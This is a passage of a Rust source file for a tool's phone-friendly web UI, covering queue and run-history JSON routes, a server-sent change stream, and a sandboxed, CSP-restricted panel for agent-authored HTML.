//! The web UI: magi's queue and run history, readable from a phone.
//!
//! The terminal is the wrong surface for the two things an operator actually
//! does between runs — file a task and check whether the last competition
//! landed. Both happen away from the desk, so they get an HTTP surface: a
//! handful of JSON routes and three embedded files.
//!
//! # One binary
//!
//! `index.html`, `app.css` and `app.js` are compiled in with [`include_str!`].
//! There is no `--assets-dir` and no filesystem fallback, because a UI that
//! reads its own front end from disk breaks the moment the binary is copied
//! somewhere else — which is exactly what `cargo install magi-cli` does. No
//! JS toolchain, no CDN, no remote font: everything the phone needs arrives
//! from this process.
//!
//! # No authentication
//!
//! There is none, deliberately, and the startup log says so. The tailnet is
//! the security boundary: `--bind auto` resolves to this machine's Tailscale
//! address, so the UI is reachable from the operator's own devices and from
//! nothing else. Anyone who can open the URL can file and hold tasks, which is
//! why binding to `0.0.0.0` is not offered and why the fallback when Tailscale
//! is missing is loopback rather than every interface.
//!
//! # Change notification
//!
//! A phone must not poll a full run list on a mobile link. `GET /api/events`
//! is a server-sent stream carrying nothing but two revision numbers — the
//! newest modification time in the queue and under the runs directory — so the
//! client refetches only what moved. The browser's own SSE reconnection covers
//! a sleeping phone; there is no session to lose.
//!
//! # Reading state must never take the server down
//!
//! A corrupt `run.json` is skipped in the list and explained with a 500 on the
//! detail route. No handler unwraps a filesystem or parse result: a single bad
//! file left by a killed run would otherwise turn the whole history into a
//! blank page.
//!
//! # Agent-authored HTML, rendered anyway
//!
//! Everything else here refuses to put API data into the document: `app.js`
//! builds nodes and sets `textContent`, and even an href from a run record is
//! laundered first. A confirmation panel breaks that rule on purpose - an
//! agent asking the owner to approve a merge needs a diff and a table, not one
//! line of prose - and the only reason it is acceptable is that the panel is
//! never part of this document.
//!
//! It is served by [`question_panel`] and [`question_asset`] and rendered in an
//! `<iframe sandbox>` carrying no tokens: no `allow-scripts`, no
//! `allow-same-origin`. So no script in a panel runs, and the frame cannot
//! reach the parent document, the cookie jar or `localStorage`. On top of that
//! both routes send [`PANEL_CSP`], which denies every network destination, so a
//! panel cannot phone home through a remote image or a beacon either - the two
//! things it may load, images and inline CSS, are the two things free
//! formatting actually needs. Assets come from the question's own directory and
//! never from the network, and their content types come from a closed
//! whitelist, so an agent cannot get markup rendered outside the frame by
//! naming a file `.html`.
//!
//! # An interview is not a filesystem read
//!
//! Every other route here is disk work, which is why [`blocking`] exists.
//! `POST /api/chats/{id}/say` is the exception: it spawns an agent CLI and
//! waits tens of seconds for a sentence. It is a plain `await` holding no lock
//! and no executor thread, and concurrent turns on one chat are refused rather
//! than queued - see [`Ui::begin_turn`].

use std::collections::HashSet;
use std::convert::Infallible;
use std::net::{IpAddr, Ipv4Addr, SocketAddr};
use std::path::{Path as FsPath, PathBuf};
use std::sync::{Arc, Mutex};
use std::time::Duration;

use anyhow::{Context, Result};
use axum::Json;
use axum::Router;
use axum::extract::rejection::JsonRejection;
use axum::extract::{Path, Query, State};
use axum::http::{HeaderValue, StatusCode, header};
use axum::response::sse::{Event, KeepAlive, Sse};
use axum::response::{IntoResponse, Response};
use axum::routing::{delete, get, post};
use jiff::Timestamp;
use serde::{Deserialize, Serialize};
use tokio_stream::StreamExt as _;
use tokio_stream::wrappers::ReceiverStream;

use crate::ask::{Answer, Question, Questions};
use crate::chat::{Chat, Chats};
use crate::config::Config;
use crate::queue::{Queue, Source, Task, TaskStatus, title_from};
use crate::run::{RunState, RunStatus};
use crate::{chat, daemon, report, run};

/// Default port. Chosen high and memorable; nothing else in the fleet uses it.
pub const DEFAULT_PORT: u16 = 7878;

/// How often the change stream restats the queue and the runs directory.
const POLL: Duration = Duration::from_secs(1);

/// Keep-alive interval for the change stream. Phones and intermediaries drop
/// an idle connection within a minute; a comment every fifteen seconds keeps
/// the stream alive without waking the radio often enough to matter.
const KEEPALIVE: Duration = Duration::from_secs(15);

/// Runs returned when the client does not ask, and the ceiling if it asks for
/// more. The cap exists because the list handler parses every `run.json` it
/// returns, and a phone cannot render two thousand rows anyway.
const LIST_DEFAULT: usize = 50;
/// Upper bound for `?limit=`.
const LIST_MAX: usize = 500;

/// Width of a generated task title, matching what the CLI uses.
const TITLE_MAX: usize = 72;

/// The header that makes serving agent-authored HTML defensible, sent by both
/// panel routes and asserted verbatim by a test.
///
/// Read it as a list of things a hostile panel cannot do. `default-src 'none'`
/// denies every fetch destination that is not re-allowed below, which is all of
/// them except images and fonts; `img-src 'self' data:` means an image comes
/// from magi's own asset route or from the document itself, so a panel cannot
/// signal an outside server by pointing an `<img>` at it - the classic
/// exfiltration channel for markup that cannot run script. `style-src
/// 'unsafe-inline'` is the one permission granted, because inline CSS is what
/// free formatting means here and a style sheet cannot make a request that
/// `default-src` has not already allowed. `base-uri 'none'` stops a `<base>`
/// tag re-pointing the relative asset URLs somewhere else, `form-action 'none'`
/// stops a form posting the owner's decision to a third party, and
/// `frame-ancestors 'self'` stops another site framing the panel to phish with
/// it.
///
/// There is deliberately no `script-src`: `default-src 'none'` already covers
/// it, and the sandboxed frame carries no `allow-scripts` either, so script is
/// denied twice over. Weakening any directive here is the difference between a
/// panel the owner reads and a page that can talk to the tailnet, which is why
/// the test compares the whole string rather than looking for a substring.
const PANEL_CSP: &str = "default-src 'none'; img-src 'self' data:; style-src 'unsafe-inline'; \
                         font-src data:; base-uri 'none'; form-action 'none'; \
                         frame-ancestors 'self'";

const INDEX_HTML: &str = include_str!("../assets/ui/index.html");
const APP_CSS: &str = include_str!("../assets/ui/app.css");
const APP_JS: &str = include_str!("../assets/ui/app.js");

/// Which address to listen on.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Bind {
    /// Ask Tailscale, and fall back to loopback with a warning.
    Auto,
    /// An address the operator named.
    Addr(IpAddr),
}

impl std::str::FromStr for Bind {
    type Err = String;

    /// `auto`, or anything [`IpAddr`] accepts. Parsing lives with the type so
    /// the CLI can take `--bind` straight into it: the one spelling of
    /// `auto` that matters is the one this function knows.
    fn from_str(s: &str) -> std::result::Result<Self, Self::Err> {
        if s.eq_ignore_ascii_case("auto") {
            return Ok(Self::Auto);
        }
        s.parse()
            .map(Self::Addr)
            .map_err(|_| format!("expected `auto` or an IP address, got `{s}`"))
    }
}

impl std::fmt::Display for Bind {
    fn fmt(&self, f: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        match self {
            Self::Auto => f.write_str("auto"),
            Self::Addr(addr) => write!(f, "{addr}"),
        }
    }
}

/// How to serve.
#[derive(Debug, Clone)]
pub struct Opts {
    /// Address to listen on.
    pub bind: Bind,
    /// Port to listen on.
    pub port: u16,
    /// Repository used for tasks posted without one.
    pub repo: PathBuf,
    /// Print the URL on its own line for a caller that wants to hand it to a
    /// browser. magi never launches one itself.
    pub open: bool,
}

impl Default for Opts {
    fn default() -> Self {
        Self {
            bind: Bind::Auto,
            port: DEFAULT_PORT,
            repo: PathBuf::from("."),
            open: false,
        }
    }
}

/// Everything the handlers touch.
///
/// The queue, the runs directory and the magi home are fields rather than
/// process-global lookups so a test drives the real router against a temp
/// directory instead of the operator's own history.
#[derive(Debug, Clone)]
pub struct Ui {
    queue: Queue,
    questions: Questions,
    chats: Chats,
    runs: PathBuf,
    home: PathBuf,
    repo: PathBuf,
    /// Chats with an agent turn in flight right now.
    ///
    /// In-process and therefore not durable, which is correct: it guards
    /// against two taps on one phone and two phones on one tailnet, both of
    /// which are this process's own concurrency. A second `magi web` would not
    /// see it, and a second `magi web` on the same home is already a
    /// misconfiguration the queue's claims would catch first.
    turns: Arc<Mutex<HashSet<String>>>,
}

impl Ui {
    /// A server over explicit paths.
    pub fn new(
        queue: Queue,
        questions: Questions,
        chats: Chats,
        runs: PathBuf,
        home: PathBuf,
        repo: PathBuf,
    ) -> Self {
        Self {
            queue,
            questions,
            chats,
            runs,
            home,
            repo,
            turns: Arc::default(),
        }
    }

    /// The operator's own state: `<home>/queue`, `<home>/questions`,
    /// `<home>/chats`, `<home>/runs`.
    pub fn open(repo: PathBuf) -> Self {
        Self::new(
            Queue::open(),
            Questions::open(),
            Chats::open(),
            run::runs_root(),
            run::home(),
            repo,
        )
    }

    /// Claim the right to run one turn in a chat, or refuse.
    ///
    /// An interview is strictly turn-based: the interviewing agent is resumed
    /// with the conversation it already has, so two turns running at once would
    /// resume the same session twice and append their answers in whatever order
    /// the two CLIs finished in. The operator would come back to a transcript
    /// with two half-turns interleaved, which is unreadable and, worse,
    /// unfixable - there is no undo for a persisted turn.
    ///
    /// Refusing with a conflict rather than queueing behind the first turn is
    /// the deliberate half. A turn takes tens of seconds, so a phone on a slow
    /// link is exactly the case where the operator taps send twice; queueing
    /// would answer the second tap with a second agent turn on text they only
    /// meant to send once, and would do it a minute later when they have
    /// stopped looking. An immediate 409 is a thing the front end can act on.
    ///
    /// The lock is a `std::sync::Mutex` and never crosses an `await`: it is
    /// taken to test-and-insert and released before the agent is spawned. The
    /// returned guard removes the id on drop, which is what makes a panicking
    /// handler or a phone that walks out of range leave the chat usable - axum
    /// drops the handler future when the client disconnects, and without the
    /// guard that chat would be wedged until the server restarted.
    fn begin_turn(&self, id: &str) -> ApiResult<TurnGuard> {
        let mut live = self
            .turns
            .lock()
            .map_err(|_| ApiError::internal("the chat turn lock was poisoned"))?;
        if !live.insert(id.to_owned()) {
            return Err(ApiError::conflict(format!(
                "chat {id} is already taking a turn"
            )));
        }
        Ok(TurnGuard {
            chat: id.to_owned(),
            turns: Arc::clone(&self.turns),
        })
    }

    /// The router, with this state baked in.
    ///
    /// The three front-end files get one explicit route each rather than a
    /// path parameter, so there is no traversal surface to get wrong: the set
    /// of servable paths is the set written here. The asset route below is the
    /// one exception and the only place in this server where a client names a
    /// file; it is why [`valid_asset_name`] is checked before a path is built.
    pub fn router(self) -> Router {
        Router::new()
            .route("/", get(index))
            .route("/app.css", get(app_css))
            .route("/app.js", get(app_js))
            .route("/api/health", get(health))
            .route("/api/runs", get(runs_list))
            .route("/api/runs/{id}", get(run_detail).delete(run_delete))
            .route("/api/runs/{id}/report", get(run_report))
            .route("/api/queue", get(queue_list).post(queue_post))
            .route("/api/queue/{id}", delete(queue_delete))
            .route("/api/queue/{id}/hold", post(queue_hold))
            .route("/api/queue/{id}/release", post(queue_release))
            .route("/api/questions", get(questions_list))
            .route("/api/questions/{id}/answer", post(question_answer))
            .route("/api/questions/{id}/panel", get(question_panel))
            // The same asset, reachable from inside the panel by its bare
            // filename. A document served at `.../panel` resolves `shot.png`
            // to `.../shot.png`, which is not the asset route, so a panel
            // written the way its author was told to write it showed broken
            // images. `base-uri 'none'` means a `<base>` tag cannot paper over
            // it - deliberately - so the fix is that the panel's own URL ends
            // in a filename and its siblings are the assets.
            .route("/api/questions/{id}/panel/index.html", get(question_panel))
            .route("/api/questions/{id}/panel/{name}", get(question_asset))
            .route("/api/questions/{id}/asset/{name}", get(question_asset))
            .route("/api/chats", get(chats_list).post(chat_post))
            .route("/api/chats/{id}", get(chat_detail))
            .route("/api/chats/{id}/say", post(chat_say))
            .route("/api/chats/{id}/file", post(chat_file))
            .route("/api/events", get(events))
            .with_state(Arc::new(self))
    }
}

/// One chat's turn slot, released on drop.
///
/// A guard rather than a matching `remove` at the end of the handler, because
/// the handler has several early returns and one `await` that can be cancelled
/// out from under it. A leaked id is a chat nobody can talk to again.
#[derive(Debug)]
struct TurnGuard {
    chat: String,
    turns: Arc<Mutex<HashSet<String>>>,
}

impl Drop for TurnGuard {
    fn drop(&mut self) {
        if let Ok(mut live) = self.turns.lock() {
            live.remove(&self.chat);
        }
    }
}

/// Serve the UI until the process is stopped.
///
/// There is no graceful-shutdown hook: the server owns no state of its own, so
/// killing it loses nothing a restart cannot rebuild from the queue and the
/// runs directory.
pub async fn serve(opts: Opts) -> Result<()> {
    let (addr, warning) = resolve_bind(&opts.bind);
    if let Some(warning) = warning {
        tracing::warn!("{warning}");
    }

    // Process-global, and therefore set exactly once, here: the report route
    // must never emit escape sequences into a browser, and toggling the flag
    // per request would race with a concurrent request rendering its own
    // report. Startup is the only moment at which no request can observe the
    // change. Nothing in the server turns colour back on.
    report::set_color(false);

    let ui = Ui::open(opts.repo);
    let socket = SocketAddr::new(addr, opts.port);
    let listener = tokio::net::TcpListener::bind(socket)
        .await
        .with_context(|| format!("bind {socket}"))?;
    let url = format!("http://{addr}:{}", opts.port);
    tracing::info!(
        "magi web UI on {url} - there is no authentication, so anyone who can \
         reach this address can file and hold tasks: the tailnet is the \
         security boundary"
    );
    if opts.open {
        // The URL alone on stdout, for a caller that wants to open it. magi
        // does not spawn a browser: on the machine this usually runs on there
        // is no display, and a failed launch would be the only output.
        println!("{url}");
    }
    axum::serve(listener, ui.router())
        .await
        .context("serve the web UI")
}

/// Resolve `--bind` to an address, plus a warning when the answer is not what
/// the operator asked for.
///
/// Split out from [`serve`] because the interesting half - deciding whether
/// Tailscale gave us something usable - is testable without opening a socket.
pub fn resolve_bind(bind: &Bind) -> (IpAddr, Option<String>) {
    match bind {
        Bind::Addr(addr) => (*addr, None),
        Bind::Auto => match tailscale_ip() {
            Ok(ip) => (IpAddr::V4(ip), None),
            Err(why) => (
                IpAddr::V4(Ipv4Addr::LOCALHOST),
                Some(format!(
                    "--bind auto fell back to 127.0.0.1: {why}. The UI is \
                     local-only and a phone cannot reach it; start Tailscale \
                     or pass --bind <addr>"
                )),
            ),
        },
    }
}

/// This machine's Tailscale IPv4, or why there is not one.
///
/// `tailscale ip -4` is a local call against the running daemon and returns in
/// milliseconds, so it is fine to make it synchronously before the server
/// exists. Only an address inside `100.64.0.0/10` is accepted: that is the
/// CGNAT block Tailscale assigns from, and anything else on that output would
/// be a different tool answering.
fn tailscale_ip() -> std::result::Result<Ipv4Addr, String> {
    let out = std::process::Command::new("tailscale")
        .args(["ip", "-4"])
        .output()
        .map_err(|e| format!("could not run `tailscale ip -4` ({e})"))?;
    if !out.status.success() {
        let why = String::from_utf8_lossy(&out.stderr);
        let why = why.trim();
        return Err(format!(
            "`tailscale ip -4` failed ({}){}",
            out.status,
            if why.is_empty() {
                String::new()
            } else {
                format!(": {why}")
            }
        ));
    }
    String::from_utf8_lossy(&out.stdout)
        .lines()
        .filter_map(|line| line.trim().parse::<Ipv4Addr>().ok())
        .find(is_tailnet)
        .ok_or_else(|| "`tailscale ip -4` printed no address in 100.64.0.0/10".to_owned())
}

/// Is this address in the CGNAT block Tailscale hands out from?
fn is_tailnet(ip: &Ipv4Addr) -> bool {
    let o = ip.octets();
    o[0] == 100 && (64..=127).contains(&o[1])
}

/// What every handler returns. Spelled out because `Result` in this crate is
/// `anyhow::Result`, and a handler's error is a status code as much as a
/// message.
type ApiResult<T> = std::result::Result<T, ApiError>;

/// A handler failure, rendered as the `{"error": ".."}` body the UI expects.
#[derive(Debug)]
struct ApiError {
    status: StatusCode,
    message: String,
    /// Every separate thing wrong with what the client sent, when there is
    /// more than one and the client is expected to fix them all.
    ///
    /// Only `POST /api/chats/{id}/file` populates it, and it is skipped when
    /// empty so every other error body stays exactly the shape the front end
    /// already parses. The reason it exists at all is that the operator
    /// rejecting a draft is on a phone: a task file with no acceptance
    /// criteria and no title is one edit, and reporting it as two round trips
    /// means asking an agent to rewrite the draft twice.
    problems: Vec<String>,
}

impl ApiError {
    /// The client asked for something malformed.
    fn bad_request(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::BAD_REQUEST,
            message: message.into(),
            problems: Vec::new(),
        }
    }

    /// The client asked for something malformed in several ways at once.
    fn bad_request_with(message: impl Into<String>, problems: Vec<String>) -> Self {
        Self {
            problems,
            ..Self::bad_request(message)
        }
    }

    /// No such run or task.
    fn not_found(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::NOT_FOUND,
            message: message.into(),
            problems: Vec::new(),
        }
    }

    /// Someone else owns the thing the client wants to change.
    /// Re-badge an error whose default mapping is wrong for this route.
    fn with_status(mut self, status: StatusCode) -> Self {
        self.status = status;
        self
    }

    /// A rules violation from a domain type, reported as the caller's fault.
    /// `Question::answer` rejects an unoffered choice, and that is a bad
    /// request, not a server error.
    fn bad_request_from(e: anyhow::Error) -> Self {
        Self::bad_request(format!("{e:#}"))
    }

    fn conflict(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::CONFLICT,
            message: message.into(),
            problems: Vec::new(),
        }
    }

    /// Our fault, or the disk's.
    fn internal(message: impl Into<String>) -> Self {
        Self {
            status: StatusCode::INTERNAL_SERVER_ERROR,
            message: message.into(),
            problems: Vec::new(),
        }
    }
}

impl From<anyhow::Error> for ApiError {
    /// Errors from `queue` and `run` carry their context chain, and the whole
    /// chain goes to the client: "parse /home/x/runs/y/run.json: expected
    /// value at line 3" is a message an operator can act on, and there is no
    /// secret in a path on a single-user tailnet.
    fn from(e: anyhow::Error) -> Self {
        Self::internal(format!("{e:#}"))
    }
}

impl IntoResponse for ApiError {
    fn into_response(self) -> Response {
        let mut body = serde_json::json!({ "error": self.message });
        if !self.problems.is_empty() {
            // `json!` above built an object, so this cannot be `None`.
            if let Some(map) = body.as_object_mut() {
                map.insert("problems".to_owned(), serde_json::json!(self.problems));
            }
        }
        (self.status, Json(body)).into_response()
    }
}

/// Run a handler's filesystem work off the executor.
///
/// Every route that touches the disk goes through here rather than each one
/// arguing about whether its own read is small enough. Uniform because the
/// expensive case is not rare: `run.json` for a finished competition holds
/// every judgement, deliberation turn and review round, so listing a few
/// hundred runs is megabytes of parsing, and the executor threads doing it are
/// the same ones serving the change stream of every other connected phone.
async fn blocking<T>(job: impl FnOnce() -> ApiResult<T> + Send + 'static) -> ApiResult<T>
where
    T: Send + 'static,
{
    match tokio::task::spawn_blocking(job).await {
        Ok(result) => result,
        Err(e) => Err(ApiError::internal(format!("filesystem task failed: {e}"))),
    }
}

async fn index() -> impl IntoResponse {
    (
        [(header::CONTENT_TYPE, "text/html; charset=utf-8")],
        INDEX_HTML,
    )
}

async fn app_css() -> impl IntoResponse {
    ([(header::CONTENT_TYPE, "text/css; charset=utf-8")], APP_CSS)
}

async fn app_js() -> impl IntoResponse {
    (
        [(header::CONTENT_TYPE, "text/javascript; charset=utf-8")],
        APP_JS,
    )
}

/// What `/api/health` answers.
#[derive(Debug, Serialize)]
struct HealthView {
    version: &'static str,
    home: String,
    queue_rev: u64,
    runs_rev: u64,
    /// The same two revisions [`events`] streams for the question and chat
    /// stores.
    ///
    /// Here because this route is what the front end falls back to when the
    /// change stream is not up - it re-polls health on a timer and on wake, and
    /// takes the revisions from the answer. Without these two the fallback
    /// compares `undefined` against `undefined` for both stores, decides
    /// nothing moved, and a phone with a dead stream never learns that a
    /// question was asked or that an interview took a turn. `queue_rev` and
    /// `runs_rev` above have always been here for exactly this reason; the rule
    /// is that every revision the stream carries, this route carries too.
    questions_rev: u64,
    /// See [`HealthView::questions_rev`].
    chats_rev: u64,
    /// Runs on disk whose state this build cannot parse - almost always a
    /// schema bump, occasionally a run killed mid-write.
    ///
    /// Reported because the list silently skips them, and "no competitions
    /// yet" is a lie when six of them are sitting in the runs directory. The
    /// terminal deck learned the same lesson: a run that fails to parse must
    /// not disappear from the count.
    runs_unreadable: usize,
    /// Questions nobody has answered yet.
    ///
    /// The one number here that means "nothing will happen until a human
    /// acts": a parked run consumes nothing and progresses never.
    questions_open: usize,
    /// Interviews the operator started in the browser and has not filed.
    ///
    /// Unlike `questions_open` nothing is blocked on these - a chat is the
    /// operator's own half-finished thought. It is here because an interview
    /// that never became a task is invisible everywhere else: it is not in the
    /// queue and it is not in the run history, so without a count the phone
    /// has no way to say "you left one open".
    chats_open: usize,
    daemon: DaemonView,
}

/// The daemon's state as the UI presents it.
#[derive(Debug, Serialize)]
struct DaemonView {
    running: bool,
    idle: Option<bool>,
    pid: Option<u32>,
    current: Option<daemon::Current>,
    completed: Option<u64>,
    stale_for_secs: Option<i64>,
}

impl DaemonView {
    /// Judge a status file. Staleness is [`daemon::Reading::running`]'s call,
    /// not this UI's — a crashed daemon must not look alive here while
    /// `doctor` calls it dead.
    fn of(status: Option<daemon::Reading>) -> Self {
        let Some(status) = status else {
            return Self {
                running: false,
                idle: None,
                pid: None,
                current: None,
                completed: None,
                stale_for_secs: None,
            };
        };
        let now = Timestamp::now();
        let age = status.age_secs(now);
        Self {
            running: status.running(now),
            idle: Some(status.idle),
            pid: status.pid,
            current: status.current,
            completed: Some(status.completed),
            stale_for_secs: age,
        }
    }
}

async fn health(State(ui): State<Arc<Ui>>) -> ApiResult<Json<HealthView>> {
    blocking(move || {
        Ok(Json(HealthView {
            version: env!("CARGO_PKG_VERSION"),
            home: ui.home.display().to_string(),
            queue_rev: ui.queue.revision(),
            runs_rev: runs_revision(&ui.runs),
            questions_rev: ui.questions.revision(),
            chats_rev: ui.chats.revision(),
            runs_unreadable: runs_unreadable(&ui.runs),
            questions_open: ui.questions.count_open(),
            chats_open: ui.chats.count_open(),
            daemon: DaemonView::of(daemon::read_status(&ui.home)),
        }))
    })
    .await
}

/// One row in the run list.
///
/// The list route returns this rather than whole `RunState`s: the summary of a
/// run is a few hundred bytes and the state is megabytes, and the difference
/// is what makes the history usable on a mobile link.
#[derive(Debug, Serialize)]
struct RunSummary {
    id: String,
    short: String,
    status: String,
    done: bool,
    instruction: String,
    title: String,
    repo: String,
    repo_name: String,
    created_at: String,
    updated_at: String,
    candidates: usize,
    viable: usize,
    judges: usize,
    winner: Option<char>,
    reviews: usize,
    quota_losses: usize,
    event: Option<String>,
    /// Blocked on a question nobody has answered.
    ///
    /// Derived from the question store rather than stored on the run: an agent
    /// calling `magi ask` blocks mid-node, and writing a status from there
    /// would race the graph's own save of `run.json` and be overwritten at the
    /// next node boundary. Asking the store is always true and never races.
    waiting: bool,
    /// The land loop's last look at the pull request, when there is one.
    pr: Option<crate::run::PrRecord>,
}

impl RunSummary {
    fn of(state: &RunState, waiting: bool) -> Self {
        Self {
            id: state.id.clone(),
            short: state.short().to_owned(),
            status: status_word(state.status),
            done: state.status.done(),
            instruction: state.instruction.clone(),
            title: title_from(&state.instruction, TITLE_MAX),
            repo: state.repo.display().to_string(),
            repo_name: state
                .repo
                .file_name()
                .map(|n| n.to_string_lossy().into_owned())
                .unwrap_or_default(),
            created_at: state.created_at.to_string(),
            updated_at: state.updated_at.to_string(),
            candidates: state.candidates.len(),
            viable: state.viable().len(),
            judges: state.config.graph.judges,
            winner: state.winner().map(|c| c.label),
            reviews: state.reviews.len(),
            quota_losses: state.quota.len(),
            event: state.events.last().map(|e| e.message.clone()),
            waiting,
            pr: state.pr.clone(),
        }
    }
}

/// `RunStatus` as the wire spells it. Every variant is one word, so this is
/// the same string `serde` writes for the status inside a full run.
fn status_word(status: RunStatus) -> String {
    format!("{status:?}").to_lowercase()
}

/// `?limit=`, clamped by the handler.
#[derive(Debug, Deserialize)]
struct ListQuery {
    #[serde(default)]
    limit: Option<usize>,
}

async fn runs_list(
    State(ui): State<Arc<Ui>>,
    Query(q): Query<ListQuery>,
) -> ApiResult<Json<Vec<RunSummary>>> {
    let limit = q.limit.unwrap_or(LIST_DEFAULT).min(LIST_MAX);
    blocking(move || {
        let summaries = run_ids(&ui.runs)
            .into_iter()
            // A run whose state cannot be read is skipped, not fatal: a run
            // killed mid-write must not blank the history of every other one.
            // The detail route still explains it, which is where an operator
            // asking "what happened to that run" ends up.
            .filter_map(|id| read_run(&ui.runs, &id).ok())
            .take(limit)
            .map(|state| {
                let waiting = !ui.questions.open_for(&state.id).is_empty();
                RunSummary::of(&state, waiting)
            })
            .collect();
        Ok(Json(summaries))
    })
    .await
}

async fn run_detail(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<RunState>> {
    blocking(move || {
        let id = resolve_run(&ui.runs, &id)?;
        Ok(Json(read_run(&ui.runs, &id)?))
    })
    .await
}

/// `DELETE /api/runs/{id}`.
///
/// Remove a finished, folded run directory along with its artifacts.
/// Running runs and runs with unfolded candidate worktrees/branches cannot be
/// deleted. This never touches git worktrees or branches.
async fn run_delete(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<StatusCode> {
    blocking(move || {
        let id = resolve_run(&ui.runs, &id)?;
        let state = read_run(&ui.runs, &id)?;
        state
            .ensure_can_delete()
            .map_err(|e| ApiError::conflict(format!("{e:#}")))?;
        let dir = ui.runs.join(&id);
        std::fs::remove_dir_all(&dir)
            .with_context(|| format!("remove run directory {}", dir.display()))?;
        Ok(StatusCode::NO_CONTENT)
    })
    .await
}

async fn run_report(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<impl IntoResponse> {
    let text = blocking(move || {
        let id = resolve_run(&ui.runs, &id)?;
        // Colour is off for the whole process, set once in `serve`. Rendering
        // is CPU work over the full state, which is the other reason this is
        // not on the executor.
        Ok(report::run(&read_run(&ui.runs, &id)?))
    })
    .await?;
    Ok(([(header::CONTENT_TYPE, "text/plain; charset=utf-8")], text))
}

/// A task as the UI sees it.
///
/// The whole task, plus the two things the client would otherwise have to
/// reimplement: the human-readable source and the status string. Nothing is
/// removed - the phone shows `last_error` and the run history verbatim.
#[derive(Debug, Serialize)]
struct TaskView {
    #[serde(flatten)]
    task: Task,
    source_label: String,
    status_str: &'static str,
}

impl From<Task> for TaskView {
    fn from(task: Task) -> Self {
        Self {
            source_label: task.source.label(),
            status_str: task.status.as_str(),
            task,
        }
    }
}

async fn queue_list(State(ui): State<Arc<Ui>>) -> ApiResult<Json<Vec<TaskView>>> {
    blocking(move || {
        Ok(Json(
            ui.queue.list().into_iter().map(TaskView::from).collect(),
        ))
    })
    .await
}

/// The body of `POST /api/queue`.
///
/// Every field defaults so the phone can send only what the operator typed,
/// and unknown fields are ignored so a newer front end talking to an older
/// binary still files the task.
#[derive(Debug, Default, Deserialize)]
#[serde(default)]
struct NewTask {
    instruction: String,
    title: Option<String>,
    repo: Option<PathBuf>,
    priority: Option<i32>,
}

async fn queue_post(
    State(ui): State<Arc<Ui>>,
    body: std::result::Result<Json<NewTask>, JsonRejection>,
) -> ApiResult<impl IntoResponse> {
    // Taken as a `Result` so a malformed body is the 400 the contract promises
    // rather than axum's default 422, which the UI has no branch for.
    let Json(body) = body.map_err(|e| ApiError::bad_request(e.body_text()))?;
    if body.instruction.trim().is_empty() {
        return Err(ApiError::bad_request(
            "instruction must not be blank: an empty task would burn a whole \
             competition on nothing",
        ));
    }
    let view = blocking(move || {
        let title = body
            .title
            .filter(|t| !t.trim().is_empty())
            .unwrap_or_else(|| title_from(&body.instruction, TITLE_MAX));
        let repo = body.repo.unwrap_or_else(|| ui.repo.clone());
        let mut task = Task::new(title, body.instruction, repo, Source::Human);
        task.priority = body.priority.unwrap_or(0);
        ui.queue.put(&mut task)?;
        Ok(TaskView::from(task))
    })
    .await?;
    Ok((StatusCode::CREATED, Json(view)))
}

async fn queue_hold(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TaskView>> {
    mutate(ui, id, Task::hold).await
}

async fn queue_release(
    State(ui): State<Arc<Ui>>,
    Path(id): Path<String>,
) -> ApiResult<Json<TaskView>> {
    mutate(ui, id, Task::release).await
}

/// `DELETE /api/queue/{id}`.
///
/// Remove a task from the backlog. Running tasks cannot be deleted (a daemon
/// is working on them), and the deletion must acquire the queue's claim lock
/// just as mutations do. The associated runs, if any, are kept: a run is
/// self-contained history and not an appendage of the task.
async fn queue_delete(State(ui): State<Arc<Ui>>, Path(id): Path<String>) -> ApiResult<StatusCode> {
    blocking(move || {
        let id = resolve_task(&ui.queue, &id)?;
        let task = ui.queue.get(&id)?;
        if task.status == TaskStatus::Running {
            return Err(ApiError::conflict(format!(
                "task {} is currently running - a daemon is running this task, so it cannot be deleted",
                task.short()
            )));
        }
        let _claim = ui.queue.claim(&id).map_err(|e| {
            ApiError::conflict(format!(
                "{e:#} - a daemon is running this task, so it cannot be deleted yet"
            ))
        })?;
        ui.queue.remove(&id)?;
        Ok(StatusCode::NO_CONTENT)
    })
    .await
}

/// Read a task, change it, write it back, under the queue's own lock.
///
/// Taking the same claim a daemon takes is what makes hold and release safe to
/// press while magi is running: without it the daemon's next save would land
/// on top of the operator's hold and the task would keep going.
async fn mutate(ui: Arc<Ui>, id: String, change: fn(&mut Task)) -> ApiResult<Json<TaskView>> {
    blocking(move || {
        let id = resolve_task(&ui.queue, &id)?;
        // `claim` fails when the lock file already exists, which is the
        // conflict the UI must report: the daemon owns that task's file for
        // as long as it is running it, and our write would be lost under its
        // next save. The message names the lock either way.
        let _claim = ui.queue.claim(&id).map_err(|e| {
            ApiError::conflict(format!(
                "{e:#} - a daemon is running this task, so it cannot be \
                 changed from here yet"
            ))
        })?;
        let mut task = ui.queue.get(&id)?;
        change(&mut task);
        ui.queue.put(&mut task)?;
        Ok(Json(TaskView::from(task)))
    })
    .await
}

/// The change stream: one revision number per store, on connect and whenever
/// any of them moves.
///
/// The poll runs in one spawned task per client, which is affordable because
/// the work is a directory scan and a `stat` per file. It stops as soon as the
/// receiver is gone, so a phone that walks out of range costs nothing after
/// its next tick - there is no session and no cleanup to forget.
async fn events(State(ui): State<Arc<Ui>>) -> impl IntoResponse {
    let (tx, rx) = tokio::sync::mpsc::channel::<Event>(4);
    tokio::spawn(async move {
        let mut ticker = tokio::time::interval(POLL);
        let mut last: Option<(u64, u64, u64, u64)> = None;
        loop {
            // The first tick completes immediately, which is what makes the
            // stream announce the current revisions on connect.
            ticker.tick().await;
            let state = Arc::clone(&ui);
            let revisions = tokio::task::spawn_blocking(move || {
                (
                    state.queue.revision(),
                    runs_revision(&state.runs),
                    state.questions.revision(),
                    state.chats.revision(),
                )
            })
            .await;
            let Ok(revisions) = revisions else { break };
            if last == Some(revisions) {
                continue;
            }
            last = Some(revisions);
            let payload = serde_json::json!({
                "queue_rev": revisions.0,
                "runs_rev": revisions.1,
                "questions_rev": revisions.2,
